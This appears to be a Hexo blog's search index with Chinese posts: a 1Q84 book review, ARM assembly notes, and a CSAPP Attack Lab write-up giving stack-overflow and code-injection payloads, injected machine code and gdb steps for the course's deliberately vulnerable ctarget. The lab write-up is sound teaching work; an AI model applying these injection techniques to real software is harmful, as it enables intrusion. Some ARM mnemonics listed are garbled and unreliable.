<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>1Q84</title>
    <url>/2020/06/21/1Q84/</url>
    <content><![CDATA[<p>这几天看完了三册共近百万字的《1Q84》，说实话并没有怎么看懂,因为作者在其中有很多谜团都没有解释清楚。比如大川奈天吾十岁的女朋友为什么突然“丧失了”，中野亚由美的死因到底是意外死亡还是有人蓄意地谋杀，小小人和空气蛹到底是怎么样的存在，它们对这个世界想要做些什么。这些作者都没有给我们一个清楚的答案。</p>
<a id="more"></a>
<p>从书名可以看出本书是致敬乔治奥威尔的《1984》，但同《1984》的不同之处在于《1984》致力于构造一个外化的、政治色彩的反乌托邦世界，在那里“老大哥”扮演着政治首脑，他（们）致力于监视民众的行为，对民众的思想进行“净化”。而在本书里则更关心人的内心世界，它从表面上看和真实世界无异，只不过，它把很多原本内化于人心之中的东西变的更为具象了，比如小小人，空气蛹，天吾父亲的“意识”变成了NHK职员。</p>
<p>青豆本身以为自己是误入了1Q84世界，但后来在刺杀“先驱”领袖的时候被告知自己进入这个世界是必然的事情，后面又反复提到“这就像一个无限的悖论，自己的意识包含着世界，而这个世界又包含着自己的意识”。毫无疑问地是，在这个故事中好像每一个人都不是那么的快乐，青豆和天吾拥有着不幸的童年，青豆的父母都是证人会的教徒，他们对青豆进行严苛的不近人情的要求，迫使她失去了童年；而天吾的父亲每周末都要带他去收NHK电视费，丧失了他自由活动的时间；牛河因为丑陋的外貌而不被人喜欢并且遭到了妻子的背叛。</p>
<p>在来到这个世界之前，青豆和天吾从来未想到去互相寻找对方，追寻自己的爱情，青豆一直想的是“能够在某一条街道偶遇川奈天吾”，这固然是一件浪漫的事情，但细想起来好像也不那么现实，在进到这个世界前，他们都以为自己只是一厢情愿，或许对方连自己的样子都记不清了，他们只是将自己关在一个房间里，那里没有门，也没有窗户，别人进不来，他们也出不去，尽管被称为“神童”并且拥有着美好的光明前途的时候，他们好像对一切都漠不关心，放弃了拼搏的动力，仅仅甘心于做一名补习课老师和体育教练，这样独自一个人，孤身，却并没有感到怎么孤独，好像也不错，但却丧失了生命的意义。</p>
<p>村上春树善于使用隐喻的手法，在这里“小小人”和“空气蛹”看起来可爱、无害，却是邪恶的代表。在我看来，这更像是心灵里邪恶的那面，它们无法攻击你本身，却可以攻击你身边的人，使人的亲人、朋友一个接一个的“丧失”，在“1Q84”世界里的丧失，在现实世界中不如说因为一个人封闭的灵魂而逐渐同社会脱节，同亲人朋友的关系逐渐冷漠。<br>
村上春树是因为东京地下铁毒气事件开始写这篇小说的，因为他被这件事情所震惊，因为他不明白为什么会有人去做这种事情，于是他花了九年的时间去做调查。在调查中发现，这些人从个人层面上看，都并没有特别邪恶或者特别愚蠢。他们只是对这个世界不满，并且沉浸在自己的乌托邦之中。</p>
<p>在这本小说中，你其实可以想象它是一个梦，在梦中进行意识的攻城略地。但无可置疑的是，如果你仅仅沉浸在自己的世界中，不去面对现实，只把自己封锁在小房子里，“小小人”就会来临，通过制造“空气蛹”来制造子体，你的意识就会慢慢地丧失。<br>
这本小说，个人感觉除了致敬《1984》之外，也有《变形记》和《追忆似水年华》的影子.</p>
<p><img src="/2020/06/21/1Q84/book.JPG" alt></p>
]]></content>
      <categories>
        <category>读书</category>
      </categories>
      <tags>
        <tag>文学</tag>
        <tag>爱情</tag>
        <tag>人生</tag>
      </tags>
  </entry>
  <entry>
    <title>ARM Linux嵌入式系统</title>
    <url>/2020/06/04/ARM-summary/</url>
    <content><![CDATA[<h2 id="arm指令集"><a class="markdownIt-Anchor" href="#arm指令集"></a> ARM指令集</h2>
<h3 id="算术运算指令"><a class="markdownIt-Anchor" href="#算术运算指令"></a> 算术运算指令</h3>
<p><strong>1.ADD指令</strong></p>
<p><code>ADD&#123;条件&#125; &#123;S&#125; &lt;dest&gt;, &lt;op_1&gt;, &lt;op_2&gt;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ADD   R0, R1, R2	; R0&#x3D;R1+R2</span><br><span class="line">ADD   R0, R1, $256	; R0&#x3D;R1+256</span><br></pre></td></tr></table></figure>
<p><strong>2.ADC指令</strong></p>
<p>用于带进位的加法运算</p>
<p><code>ADC&#123;条件&#125;&#123;S&#125; &lt;dest&gt;, &lt;op_1&gt;, &lt;op_2&gt;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ADCS   R0,R2,R3   ;带进位加，结果保存在R0和R1寄存器</span><br></pre></td></tr></table></figure>
<p><strong>3.SUB命令</strong></p>
<p>减法运算</p>
<p><code>SUB&#123;条件&#125;&#123;S&#125; &lt;dest&gt;, &lt;op_1&gt;, &lt;op_2&gt;</code></p>
<p><strong>4.SBC指令</strong></p>
<p>用于带借位的减法运算</p>
<p><code>SBC&#123;条件&#125;&#123;S&#125; &lt;dest&gt;, &lt;op_1&gt;, &lt;op_2&gt;</code></p>
<a id="more"></a>
<h3 id="逻辑运算指令"><a class="markdownIt-Anchor" href="#逻辑运算指令"></a> 逻辑运算指令</h3>
<p><strong>1.AND指令</strong></p>
<p><code>AND&#123;条件&#125;&#123;S&#125; &lt;dest&gt;, &lt;op_1&gt;, &lt;op_2&gt;</code></p>
<p><strong>2.EOR指令</strong></p>
<p>异或运算</p>
<p><code>EOR&#123;条件&#125;&#123;S&#125; &lt;dest&gt;, &lt;op_1&gt;, &lt;op_2&gt;</code></p>
<p><strong>3.MOV指令</strong></p>
<p>MOV可以在两个操作数之间复制数据</p>
<p><code>MOV&#123;条件&#125;&#123;S&#125; &lt;dest&gt;, &lt;op_1&gt;</code></p>
<h3 id="分支指令"><a class="markdownIt-Anchor" href="#分支指令"></a> 分支指令</h3>
<p><strong>B指令</strong></p>
<p>B指令可以根据设置的条件跳转带指定的代码位置</p>
<p><code>B&#123;条件&#125; &lt;地址&gt;</code></p>
<h3 id="数据传送指令"><a class="markdownIt-Anchor" href="#数据传送指令"></a> 数据传送指令</h3>
<p><strong>1.单一数据传送指令</strong></p>
<p>单一数据传送指令用于向内存转载和存储一个字节或者一个字长的数据。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LDR&#123;条件&#125;   Rd，&lt;地址&gt;</span><br><span class="line">STR&#123;条件&#125;   Rd，&lt;地址&gt;</span><br><span class="line">LDR&#123;条件&#125;B   Rd，&lt;地址&gt;</span><br><span class="line">STR&#123;条件&#125;B   Rd，&lt;地址&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">STR   Rd, [Rbase]          ;存储Rd到Rbase所包含的有效地址</span><br><span class="line">STR   Rd, [Rbase, Rindex]  ;存储到Rd到Rbase+Rindex缩合成的有效地址</span><br><span class="line">STR   Rd, [Rbase, $index]  ;存储到Rd到Rbase+index所合成的有效地址</span><br></pre></td></tr></table></figure>
<p><strong>2.多数据传送指令</strong></p>
<p>多数据传送指令用于向内存装载和存储多个字节或字的数据。</p>
<p><code>xxM&#123;条件&#125;&#123;类型&#125; Rn&#123;!&#125;, &lt;寄存器列表&gt;&#123;^&#125;</code></p>
<p>其中，xx可以是LD，表示装载，也可以为ST，表示存储。多数据传送指令用于寄存器和内存中多个数据的复制。指令包括：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LDMED    LDMED    ;装载前增加地址，相当于C中的++p</span><br><span class="line">LDMFD    LDMIA    ;装载后增加地址，相当于C中的p++</span><br><span class="line">LDMED    LDMED    ;装载前减小值，相当于C中的++*p</span><br><span class="line">LDMED    LDMED    ;装载后减小值，相当于C中的*p++</span><br><span class="line">STMFA    STMIB    ;存储前增加地址</span><br><span class="line">STMEA    STMIA    ;存储后增加地址</span><br><span class="line">STMFD    STMDB    ;存储前增加值</span><br><span class="line">STMED    STMDA    ;存储后增加值</span><br></pre></td></tr></table></figure>
<h2 id="arm结构"><a class="markdownIt-Anchor" href="#arm结构"></a> ARM结构</h2>
<h3 id="寻址方式"><a class="markdownIt-Anchor" href="#寻址方式"></a> 寻址方式</h3>
<p><strong>1.立即寻址</strong></p>
<p>立即寻址方式中操作数已经写在了指令里面，取出指令时会把操作数也取出来。这是最简单的寻址方式。</p>
<p><strong>2.寄存器寻址</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MOV R1, R2     ;把R2的值赋给R1</span><br><span class="line">SUB R0, R1, R2 ;把R1-R2的值写给R0</span><br></pre></td></tr></table></figure>
<p><strong>3.寄存器偏移寻址</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MOV R0, R1, LSL #3       ;把R1的值左移三位写入R0</span><br><span class="line">ANDS R0, R1, R2, LSL #R3 ;把R2的值左移R3位，然后与R1做与操作，结果写入R0</span><br></pre></td></tr></table></figure>
<p><strong>4.寄存器间接寻址</strong></p>
<p>该方式把寄存器的值当做地址，然后从对应的内存中取出数据。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LDR R0, [R1]        ;把R1的值当做地址，从内存中取出数据存放到R0</span><br><span class="line">SWP R0, R0, [R1]    ;把R1的值当做地址，从内存中取出数据与R0交换</span><br></pre></td></tr></table></figure>
<p><strong>5，基址寻址</strong></p>
<p>该方式把寄存器的内容与指定的偏移相加，得到数据地址，然后从内存取得数据。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LDR R0, [R1, #0xf]      ;把R1的数值与0xf相加得到数据地址</span><br><span class="line">STR R0，[R1, #-2]</span><br></pre></td></tr></table></figure>
<p><strong>6.多寄存器寻址</strong></p>
<p>该方式允许一次可以传输多个寄存器的值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LDMIA R1!, &#123;R2-R7,R12&#125;   ;把R1单元中的数据读出到R2~R7和R12，R1指定的地址自动加1</span><br><span class="line">STMIA R0,  &#123;R3-R6,R10&#125;   ;把R3~R6和R10中的数据保存到R0指向的地址，R0的地址自动加1</span><br></pre></td></tr></table></figure>
<p><strong>7.栈寻址</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">STMFD SP!, &#123;R0~R7, LR&#125;     ;把R0~R7的内容压入堆栈</span><br><span class="line">LDMFD SP!, &#123;R0,R7, LR&#125;     ;从堆栈中取出数据到R0~R7和LR</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>嵌入式系统</tag>
        <tag>ARM</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Attack Lab实验报告</title>
    <url>/2020/04/02/Attack-Lab/</url>
    <content><![CDATA[<p><img src="/2020/04/02/Attack-Lab/csapp.jpg" alt></p>
<a id="more"></a>
<h1 id="csapp-attack-lab-解题报告"><a class="markdownIt-Anchor" href="#csapp-attack-lab-解题报告"></a> CSAPP Attack Lab 解题报告</h1>
<h2 id="level1"><a class="markdownIt-Anchor" href="#level1"></a> Level1:</h2>
<h3 id="目标执行touch1函数"><a class="markdownIt-Anchor" href="#目标执行touch1函数"></a> 目标：执行touch1函数：</h3>
<p>在本题的讲义中给出了<code>getbuf</code>、<code>test</code>和<code>touch1</code>三个函数的C语言描述：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>该题的意图是我们应当利用<code>getbuf</code>中的缓冲区溢出漏洞使得执行<code>getbuf</code>之后重定向至<code>touch1</code>即可。因此我们需要确定<code>BUFFER_SIZE</code>的大小以及<code>touch1</code>函数所在的地址。</p>
<h4 id="首先反编译ctarget"><a class="markdownIt-Anchor" href="#首先反编译ctarget"></a> 首先反编译ctarget</h4>
<p>在Linux上使用命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -d ctarget &gt; ctarget.asm </span><br></pre></td></tr></table></figure>
<p>将<code>ctarget</code>反汇编成<code>ctarget.asm</code></p>
<h4 id="在ctarget上搜索touch1函数以及getbuf函数可以使用编辑器代码搜索功能"><a class="markdownIt-Anchor" href="#在ctarget上搜索touch1函数以及getbuf函数可以使用编辑器代码搜索功能"></a> 在ctarget上搜索touch1函数以及getbuf函数（可以使用编辑器代码搜索功能）</h4>
<p>可以发现getbuf的汇编代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:  48 83 ec 28            sub    $0x28,%rsp</span><br><span class="line">  4017ac:  48 89 e7               mov    %rsp,%rdi</span><br><span class="line">  4017af:  e8 ac 03 00 00         callq  401b60 &lt;Gets&gt;</span><br><span class="line">  4017b4:  b8 01 00 00 00         mov    $0x1,%eax</span><br><span class="line">  4017b9:  48 83 c4 28            add    $0x28,%rsp</span><br><span class="line">  4017bd:  c3                     retq   </span><br><span class="line">  4017be:  90                     nop</span><br><span class="line">  4017bf:  90                     nop</span><br></pre></td></tr></table></figure>
<p>从这里我们可以观察到<code>getbuf</code>函数首先执行了将rsp寄存器减去0x28这个操作，即将栈顶指针向下移40个比特位，因此我们可以推断出<code>BUFFER_SIZE</code>的大小为40。</p>
<p>之后我们可以同样使用这种方法搜索touch1函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:  48 83 ec 08            sub    $0x8,%rsp</span><br><span class="line">  4017c4:  c7 05 0e 3d 20 00 01   movl   $0x1,0x203d0e(%rip)        # 6054dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:  00 00 00 </span><br><span class="line">  4017ce:  bf e5 31 40 00         mov    $0x4031e5,%edi</span><br><span class="line">  4017d3:  e8 e8 f4 ff ff         callq  400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:  bf 01 00 00 00         mov    $0x1,%edi</span><br><span class="line">  4017dd:  e8 cb 05 00 00         callq  401dad &lt;validate&gt;</span><br><span class="line">  4017e2:  bf 00 00 00 00         mov    $0x0,%edi</span><br><span class="line">  4017e7:  e8 54 f6 ff ff         callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
<p>在该段汇编代码中，我们同样可以看出touch1函数的地址为0x4017c0。</p>
<p>因此编写输入数据就简单了。</p>
<p>首先打开一个文件写入数据：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim touch1.txt</span><br></pre></td></tr></table></figure>
<p>编辑文件如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">c0 17 40 00</span><br></pre></td></tr></table></figure>
<p>前40位可以任意填充，在40位后即为缓存区溢出位，这里压入的是函数返回地址，因此将<code>touch1</code>函数的地址写入即可在<code>ret</code>之后返回至<code>touch1</code>函数并执行。</p>
<p>最终我们使用hex2raw工具执行代码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat touch1.txt | ./hex2raw | ./ctarget -q</span><br></pre></td></tr></table></figure>
<p>最终运行结果如下：</p>
<p><img src="/2020/04/02/Attack-Lab/level1.png" alt></p>
<h2 id="level2"><a class="markdownIt-Anchor" href="#level2"></a> Level2:</h2>
<h3 id="目标执行函数touch2并传入cookie的值作为参数val"><a class="markdownIt-Anchor" href="#目标执行函数touch2并传入cookie的值作为参数val"></a> 目标：执行函数touch2,并传入cookie的值作为参数val</h3>
<p>同样，在本题中也给出了<code>touch2</code>的函数实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span>&#123;</span><br><span class="line">    vlevel = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (val == cookie)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">        fail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过在反汇编中寻找<code>touch2</code>代码，我们发现<code>touch2</code>的汇编语言如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  4017ec:  48 83 ec 08            sub    $0x8,%rsp</span><br><span class="line">  4017f0:  89 fa                  mov    %edi,%edx</span><br><span class="line">  4017f2:  c7 05 e0 3c 20 00 02   movl   $0x2,0x203ce0(%rip)        # 6054dc &lt;vlevel&gt;</span><br><span class="line">  4017f9:  00 00 00 </span><br><span class="line">  4017fc:  3b 3d e2 3c 20 00      cmp    0x203ce2(%rip),%edi        # 6054e4 &lt;cookie&gt;</span><br><span class="line">  401802:  75 20                  jne    401824 &lt;touch2+0x38&gt;</span><br><span class="line">  401804:  be 08 32 40 00         mov    $0x403208,%esi</span><br><span class="line">  401809:  bf 01 00 00 00         mov    $0x1,%edi</span><br><span class="line">  40180e:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line">  401813:  e8 d8 f5 ff ff         callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401818:  bf 02 00 00 00         mov    $0x2,%edi</span><br><span class="line">  40181d:  e8 8b 05 00 00         callq  401dad &lt;validate&gt;</span><br><span class="line">  401822:  eb 1e                  jmp    401842 &lt;touch2+0x56&gt;</span><br><span class="line">  401824:  be 30 32 40 00         mov    $0x403230,%esi</span><br><span class="line">  401829:  bf 01 00 00 00         mov    $0x1,%edi</span><br><span class="line">  40182e:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line">  401833:  e8 b8 f5 ff ff         callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401838:  bf 02 00 00 00         mov    $0x2,%edi</span><br><span class="line">  40183d:  e8 2d 06 00 00         callq  401e6f &lt;fail&gt;</span><br><span class="line">  401842:  bf 00 00 00 00         mov    $0x0,%edi</span><br><span class="line">  401847:  e8 f4 f5 ff ff         callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
<p>同样，我们找到了<code>touch2</code>函数的地址为<code>0x4017</code>。</p>
<p>由于本题需要在<code>touch2</code>中传入<code>cookie</code>参数才能执行成功，因此我们需要在输入文件中注入代码，并且将函数返回地址修改为代码注入的地址以实现代码注入攻击，因此我们需要知道<code>getbuf</code>函数栈顶地址（因为在此处我们需要注入代码）。</p>
<p>使用GDB调试一下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb ctarget</span><br><span class="line"></span><br><span class="line">(gdb) set args -q</span><br><span class="line"></span><br><span class="line">(gdb) b getbuf</span><br><span class="line"></span><br><span class="line">(gdb) r </span><br><span class="line"></span><br><span class="line">(gdb) ni </span><br><span class="line"></span><br><span class="line">(gdb) p/x $rsp</span><br></pre></td></tr></table></figure>
<p>在命令行中我们调试ctarget程序并且在getbuf函数上打断点，在<code>getbuf</code>执行一步过后，即<code>sub $0x28 ,%rsp</code>之后我们查看<code>$rsp</code>寄存器的值，输出：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">1 = 0x5561dc78</span></span><br></pre></td></tr></table></figure>
<p>接下来我们使用vim编辑注入汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    $0x59b997fa,%rdi</span><br><span class="line">push   $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>然后将汇编代码后编译后再进行反编译以获取机器代码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -c touch2.s</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -d touch2.o</span><br></pre></td></tr></table></figure>
<p>然后可以获取<code>touch2</code>的机器级代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 </span><br><span class="line"></span><br><span class="line">68 ec 17 40 00</span><br><span class="line"></span><br><span class="line">c3</span><br></pre></td></tr></table></figure>
<p>基于以上的信息我们就可以编辑输入文件了！</p>
<p>输入文件如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>在栈顶进行代码注入，同时在溢出去返回栈顶地址。</p>
<p>使用<code>hex2raw</code>进行输入。</p>
<p>结果如下：</p>
<p><img src="/2020/04/02/Attack-Lab/level2.png" alt></p>
<h2 id="level3"><a class="markdownIt-Anchor" href="#level3"></a> level3:</h2>
<h3 id="目标执行函数touch3并传入cookie的值的字符串作为参数sval"><a class="markdownIt-Anchor" href="#目标执行函数touch3并传入cookie的值的字符串作为参数sval"></a> 目标：执行函数touch3，并传入cookie的值的字符串作为参数sval</h3>
<p>与level2类似，区别在于我们这次需要构造一个字符串，而不是直接传一个整数，需要注意字符串保存位置。</p>
<p>讲义给出了<code>hexmatch</code>和<code>touch3</code>的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可见需要传入表示 <code>cookie</code> 的值的字符串作为参数 <code>sval</code>。同时函数 <code>hexmatch</code> 的设计使得直接获取用于检验的字符串较为困难，因此我们需要自行构造这个字符串。</p>
<p>因此我们需要查看touch3的地址：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004018fa &lt;touch3&gt;:</span><br><span class="line">  4018fa:  53                     push   %rbx</span><br><span class="line">  4018fb:  48 89 fb               mov    %rdi,%rbx</span><br><span class="line">  4018fe:  c7 05 d4 3b 20 00 03   movl   $0x3,0x203bd4(%rip)        # 6054dc &lt;vlevel&gt;</span><br><span class="line">  401905:  00 00 00 </span><br><span class="line">  401908:  48 89 fe               mov    %rdi,%rsi</span><br><span class="line">  40190b:  8b 3d d3 3b 20 00      mov    0x203bd3(%rip),%edi        # 6054e4 &lt;cookie&gt;</span><br><span class="line">  401911:  e8 36 ff ff ff         callq  40184c &lt;hexmatch&gt;</span><br><span class="line">  401916:  85 c0                  test   %eax,%eax</span><br><span class="line">  401918:  74 23                  je     40193d &lt;touch3+0x43&gt;</span><br><span class="line">  40191a:  48 89 da               mov    %rbx,%rdx</span><br><span class="line">  40191d:  be 58 32 40 00         mov    $0x403258,%esi</span><br><span class="line">  401922:  bf 01 00 00 00         mov    $0x1,%edi</span><br><span class="line">  401927:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line">  40192c:  e8 bf f4 ff ff         callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401931:  bf 03 00 00 00         mov    $0x3,%edi</span><br><span class="line">  401936:  e8 72 04 00 00         callq  401dad &lt;validate&gt;</span><br><span class="line">  40193b:  eb 21                  jmp    40195e &lt;touch3+0x64&gt;</span><br><span class="line">  40193d:  48 89 da               mov    %rbx,%rdx</span><br><span class="line">  401940:  be 80 32 40 00         mov    $0x403280,%esi</span><br><span class="line">  401945:  bf 01 00 00 00         mov    $0x1,%edi</span><br><span class="line">  40194a:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line">  40194f:  e8 9c f4 ff ff         callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401954:  bf 03 00 00 00         mov    $0x3,%edi</span><br><span class="line">  401959:  e8 11 05 00 00         callq  401e6f &lt;fail&gt;</span><br><span class="line">  40195e:  bf 00 00 00 00         mov    $0x0,%edi</span><br><span class="line">  401963:  e8 d8 f4 ff ff         callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
<p>touch3的汇编代码如上所示，了解到<code>touch3</code>的地址为<code>0x4018fa</code>，因此我们可以基于此地址构造注入代码。在写注入代码前我们还需要了解到<code>cookie</code>数值的字符串表示，以及该字符串在栈中存放位置。</p>
<p>其中cookie的字符串表示可以通过查询ASCII码表或者使用高级语言输出来获得。</p>
<p>关于字符串在栈中的存放位置，我们可以试想一下，如果将cookie字符串的编码放在返回地址下面的时候，当我们<code>return</code>至<code>touch3</code>所在函数时会进行数据的入栈，因此当从栈中地址取出字符串参数时，该字符串已经被破坏掉了，因此我们需要将cookie字符串放在return地址的上面，为了安全起见，我们将<code>cookie</code>的值设置为<code>%rsp+48</code>的位置。</p>
<p>接下来编辑汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov $0x5561dca8,%rdi</span><br><span class="line">push $0x4018fa</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>其中<code>0x5561dca8</code>这个地址是将栈顶指针加上48得到的。</p>
<p>之后，同level2一样，我们对注入代码进行汇编、反汇编获取机器码，这里不再赘述。</p>
<p>获取到的机器码为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55</span><br><span class="line"></span><br><span class="line">68 fa 18 40 00</span><br><span class="line"></span><br><span class="line">c3</span><br></pre></td></tr></table></figure>
<p>在之后我们就可以编写输入文件了。</p>
<p>输入文件如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8</span><br><span class="line">dc 61 55 68</span><br><span class="line">fa 18 40 00</span><br><span class="line">c3 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">78 dc 61 55</span><br><span class="line">00 00 00 00</span><br><span class="line">35 39 62 39</span><br><span class="line">39 37 66 61</span><br></pre></td></tr></table></figure>
<p>然后继续使用<code>hex2raw</code>工具进行输入。</p>
<p>输入结果如下：</p>
<p><img src="/2020/04/02/Attack-Lab/level3.png" alt></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>汇编</tag>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>Cache Lab实验报告</title>
    <url>/2020/04/29/Cache-Lab/</url>
    <content><![CDATA[<p><img src="/2020/04/29/Cache-Lab/csapp.jpg" alt></p>
<a id="more"></a>
<h1 id="csapp-cache-lab解题报告"><a class="markdownIt-Anchor" href="#csapp-cache-lab解题报告"></a> CSAPP Cache Lab解题报告</h1>
